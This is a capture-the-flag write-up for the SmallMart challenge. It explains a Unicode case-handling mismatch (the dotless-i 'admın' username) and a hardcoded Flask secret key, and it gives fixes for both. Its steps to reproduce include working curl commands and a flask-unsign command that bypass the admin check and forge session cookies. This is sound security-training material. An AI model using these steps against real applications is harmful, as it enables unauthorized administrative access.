# SmallMart - Admin Access Bypass (Unicode Case Handling)

## Overview
SmallMart uses different case handling in two places. Registration checks `username.lower()` against `"admin"`, while the admin gate uses `re.IGNORECASE`. Those two behave differently with some Unicode letters, so a username can slip past registration yet still match the admin check.

## Scope
- Target: https://2cat0a0mm8d8.ctfhub.io
- Platform: HackingHub
- Challenge: SmallMart

## Challenge Details
SmallMart is a lightweight online store used by a local shop to manage daily inventory and user accounts. The application looks simple, but it has recently undergone several rushed updates to improve usability and internal access controls. The objective is to identify and exploit a vulnerability by reviewing the provided source code.

Challenge metadata:
- Difficulty: Advanced
- Released: Feb 9th, 2026
- Author: RezyDev
- Flag: 1 / 1

## Root Cause
There are two distinct issues in the provided code.

### Vulnerability 1: Unicode casefold mismatch (admin bypass)
From the source:
- Registration blocks only `username.lower() == "admin"` ([app.py](app.py#L124))
- Admin gate uses `re.match(r"^admin$", name, flags=re.IGNORECASE)` ([app.py](app.py#L103))

`lower()` and `re.IGNORECASE` do not treat all Unicode characters the same way. That mismatch is the bug.

### Vulnerability 2: Hardcoded default secret key (session forgery)
The secret key falls back to a hardcoded default: `"fake_key_for_testing"` ([app.py](app.py#L16)).

If a deployment keeps this default, anyone with the source code can forge session cookies.

## Impact
- Admin access and flag disclosure via Unicode username bypass.
- If the default secret is used, session cookie forgery also grants admin access without registration.

## Steps to Reproduce
Run in HackBox or any terminal with `curl`.

### Scenario A: Unicode bypass (live target)
This is the path that worked on the live instance where `SECRET_KEY` is set.

1) Set target and password:
```bash
TARGET="https://2cat0a0mm8d8.ctfhub.io"
PASS="test123"
```

2) Register and login with a Unicode username using U+0131 (dotless i):
```bash
USER=$(printf 'adm\u0131n')

curl -s -L -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/register" >/dev/null

curl -s -L -c /tmp/c.txt -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/login" >/dev/null
```

3) Access admin and extract the flag:
```bash
curl -s -b /tmp/c.txt "$TARGET/admin" | grep -oE "flag\{[^}]+\}"
```

Expected result: HTTP 200 from `/admin` and the flag appears in the response.

### Scenario B: Default secret (local or misconfigured deployments)
If the server is running with the default `fake_key_for_testing`, you can forge a session cookie. This does not work on the live instance because `SECRET_KEY` is set.

```bash
TARGET="http://localhost:5137"

ADMIN_COOKIE=$(flask-unsign --sign --cookie "{'user': 'Admin'}" --secret 'fake_key_for_testing')
curl -s -b "session=$ADMIN_COOKIE" "$TARGET/admin" | grep -oE "flag\{[^}]+\}"
```

## Why It Works
- Registration uses `lower()` and misses some Unicode case mappings.
- The admin check uses `re.IGNORECASE`, which treats those characters as equivalent to `i`.
- The mismatch lets the user pass the admin check.

## Recommended Fix
- Normalize usernames consistently (for example: Unicode normalization + `casefold()`), or
- Use strict, consistent case-sensitive checks for both registration and admin gate.
- Remove the hardcoded fallback secret and require a strong `SECRET_KEY` in production.

## Code Fix
Apply the patch in `fix.patch` or update the app with these changes:

```python
import unicodedata

def normalize_username(name: str) -> str:
  return unicodedata.normalize("NFKC", name or "").casefold().strip()

app.secret_key = os.environ.get("SECRET_KEY")
if not app.secret_key:
  raise RuntimeError("SECRET_KEY must be set")

# Use normalize_username() in register/login/admin checks
```

## Proof (Redacted)
```bash
$ curl -s -b /tmp/c.txt "$TARGET/admin" | grep -oE "flag\{[^}]+\}"
flag{REDACTED}
```

## Notes
- Live instance validated with the Unicode bypass path.
- The hardcoded secret issue is still a real risk for any deployment that keeps the default.
